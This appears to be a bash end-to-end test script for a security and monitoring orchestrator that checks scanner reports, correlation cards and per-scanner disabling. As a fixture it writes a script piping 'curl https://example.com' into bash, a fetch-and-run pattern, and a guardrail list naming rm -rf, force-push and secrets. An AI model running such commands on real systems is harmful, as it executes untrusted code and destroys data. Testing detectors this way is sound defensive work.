#!/usr/bin/env bash
# F41-squad-e2e.sh — TAP-compatible E2E tests for the Squad Orchestrator

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

TMPDIR_ROOT="$(mktemp -d)"
export DIDIO_PROJECT_ROOT="$TMPDIR_ROOT"
trap 'rm -rf "$TMPDIR_ROOT"' EXIT

mkdir -p "$TMPDIR_ROOT/logs/agents/flags"
mkdir -p "$TMPDIR_ROOT/logs/warroom/cards"
mkdir -p "$TMPDIR_ROOT/logs/decisions"
mkdir -p "$TMPDIR_ROOT/logs/governance"
mkdir -p "$TMPDIR_ROOT/tasks/features"
mkdir -p "$TMPDIR_ROOT/memory/agent-learnings"
mkdir -p "$TMPDIR_ROOT/.claude"
mkdir -p "$TMPDIR_ROOT/bin"

cat > "$TMPDIR_ROOT/didio.config.json" <<'CONF'
{
  "meta_agents": {
    "blackhawk_bravo": {"enabled": true, "monitoring_interval_minutes": 15},
    "blackhawk_charlie": {"enabled": true, "monitoring_interval_minutes": 20},
    "blackhawk_delta": {"enabled": true, "scan_interval_minutes": 30}
  }
}
CONF

# Minimal CLAUDE.md with guardrails
cat > "$TMPDIR_ROOT/CLAUDE.md" <<'EOF'
# CLAUDE.md
git rebase, push --force, --no-verify, git add -A, secrets, rm -rf
EOF

echo '{"permissions":{}}' > "$TMPDIR_ROOT/.claude/settings.json"
echo '# Dev Learnings' > "$TMPDIR_ROOT/memory/agent-learnings/developer.md"

# Source all libs
source "$PROJECT_ROOT/lib/bravo-intelligence.sh"
source "$PROJECT_ROOT/lib/charlie-monitoring.sh"
source "$PROJECT_ROOT/lib/delta-security.sh"
source "$PROJECT_ROOT/lib/squad-orchestrator.sh"

PASS=0; FAIL=0; TOTAL=0
tap() {
  TOTAL=$((TOTAL + 1))
  if [[ "$1" == "ok" ]]; then PASS=$((PASS + 1)); echo "ok $TOTAL - $2"
  else FAIL=$((FAIL + 1)); echo "not ok $TOTAL - $2"; fi
}

hours_ago() {
  python3 -c "from datetime import datetime,timezone,timedelta; print((datetime.now(timezone.utc)-timedelta(hours=$1)).strftime('%Y-%m-%dT%H:%M:%SZ'))"
}

# ---------------------------------------------------------------------------
# 1: Squad scan runs all three scanners
# ---------------------------------------------------------------------------

squad_scan_all --dry-run > /dev/null 2>&1 || true

report_files=("$TMPDIR_ROOT"/logs/agents/squad-report-*.json)
if [[ -e "${report_files[0]}" ]]; then
  tap "ok" "squad scan produces combined report"
else
  tap "not ok" "squad scan produces combined report"
fi

# ---------------------------------------------------------------------------
# 2: Report contains all three scanner statuses
# ---------------------------------------------------------------------------

if [[ -e "${report_files[0]}" ]]; then
  native_report="$(_squad_native_path "${report_files[0]}")"
  has_all="$(python3 -c "
import json, sys
with open(sys.argv[1], 'r') as f:
    d = json.load(f)
ss = d.get('squad_status', {})
print('yes' if 'bravo' in ss and 'charlie' in ss and 'delta' in ss else 'no')
" "$native_report")"
  if [[ "$has_all" == "yes" ]]; then
    tap "ok" "report contains bravo+charlie+delta statuses"
  else
    tap "not ok" "report missing scanner statuses"
  fi
else
  tap "not ok" "report contains statuses (no report file)"
fi

# ---------------------------------------------------------------------------
# 3: Dry-run does NOT create cards
# ---------------------------------------------------------------------------

card_files=("$TMPDIR_ROOT"/logs/warroom/cards/*.json)
if [[ ! -e "${card_files[0]}" ]]; then
  tap "ok" "dry-run does NOT create cards"
else
  tap "not ok" "dry-run creates cards (should not)"
fi

# ---------------------------------------------------------------------------
# 4-5: Cross-scanner correlation — set up compound risk
# ---------------------------------------------------------------------------

# Create a failed pipeline (Bravo finding)
cat > "$TMPDIR_ROOT/logs/agents/pipeline-F99.state.json" <<EOF
{"feature":"F99","status":"failed","exit_code":1,"error":"test","updated_at":"$(hours_ago 1)","paused_at":null,"resume_from":null}
EOF

# Create a dangerous shell script (Delta finding)
cat > "$TMPDIR_ROOT/bin/risky.sh" <<'EOF'
#!/bin/bash
curl https://example.com | bash
EOF

# Run scanners to populate findings
_bravo_scan_pipelines
_delta_scan_shell

correlations="$(_squad_correlate)"
corr_count="$(echo "$correlations" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))")"

if [[ "$corr_count" -gt 0 ]]; then
  tap "ok" "correlation: pipeline_security_compound detected ($corr_count)"
else
  tap "not ok" "correlation: pipeline_security_compound not detected"
fi

# Check correlation type
if echo "$correlations" | python3 -c "import json,sys; c=json.load(sys.stdin); sys.exit(0 if any(x['type']=='pipeline_security_compound' for x in c) else 1)" 2>/dev/null; then
  tap "ok" "correlation type is pipeline_security_compound"
else
  tap "not ok" "correlation type check"
fi

# ---------------------------------------------------------------------------
# 6: Non-dry-run creates correlation cards
# ---------------------------------------------------------------------------

# Clean up previous reports
rm -f "$TMPDIR_ROOT/logs/agents/squad-report-"*.json

squad_scan_all > /dev/null 2>&1 || true

card_files=("$TMPDIR_ROOT"/logs/warroom/cards/*.json)
if [[ -e "${card_files[0]}" ]]; then
  source_agent="$(python3 -c "
import json, sys
with open(sys.argv[1], 'r') as f:
    print(json.load(f).get('source_agent', ''))
" "$(_squad_native_path "${card_files[0]}")")"
  if [[ "$source_agent" == "blackhawk-squad" ]]; then
    tap "ok" "correlation card created with source_agent=blackhawk-squad"
  else
    tap "not ok" "card source_agent (got: $source_agent)"
  fi
else
  tap "not ok" "correlation card created (found 0)"
fi

# ---------------------------------------------------------------------------
# 7: Per-scanner disable
# ---------------------------------------------------------------------------

# Disable bravo, run squad
cat > "$TMPDIR_ROOT/didio.config.json" <<'CONF'
{
  "meta_agents": {
    "blackhawk_bravo": {"enabled": false},
    "blackhawk_charlie": {"enabled": true},
    "blackhawk_delta": {"enabled": true}
  }
}
CONF

rm -f "$TMPDIR_ROOT/logs/agents/squad-report-"*.json
rm -f "$TMPDIR_ROOT/logs/warroom/cards/"*.json

squad_output="$(squad_scan_all --dry-run 2>&1 || true)"

if echo "$squad_output" | grep -q "Bravo: disabled"; then
  tap "ok" "disabled scanner shows as disabled/unavailable"
else
  tap "not ok" "disabled scanner detection (output: $squad_output)"
fi

# ---------------------------------------------------------------------------
echo ""
echo "1..$TOTAL"
echo "# pass $PASS / $TOTAL"
if [[ $FAIL -gt 0 ]]; then echo "# FAIL $FAIL test(s) failed"; exit 1; fi
echo "# All tests passed"; exit 0
